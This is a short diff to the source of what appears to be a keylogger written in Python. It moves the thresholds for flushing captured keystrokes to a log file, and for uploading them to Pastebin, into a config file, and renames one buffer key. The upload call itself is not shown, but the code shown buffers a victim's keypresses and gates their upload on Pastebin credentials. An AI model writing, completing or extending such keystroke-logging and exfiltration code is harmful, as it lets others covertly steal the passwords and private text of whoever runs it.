@@ -75,8 +75,8 @@ with open(log_file, 'w') as f:
 # so instead we buffer and flush it to file every 100 keypresses
 buff = dict()
 buff['buff'] = ''
-buff['num_keypresses_between_log_updates'] = 100
-buff['num_keypresses_before_upload'] = 1000
+buff['num_keypresses_between_log_updates'] = config.num_keypresses_between_log_updates
+buff['num_keypresses_between_uploads'] = config.num_keypresses_between_uploads
 buff['keypress_log_count'] = 0
 buff['keypress_upload_count'] = 0
 
@@ -97,7 +97,7 @@ def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
             buff['buff'] = ''
             buff['keypress_log_count'] = 0
         if buff['keypress_upload_count'] == \
-           buff['num_keypresses_before_upload'] and \
+           buff['num_keypresses_between_uploads'] and \
            config.pastebin_username and \
            config.pastebin_password and \
            config.pastebin_api_dev_key:
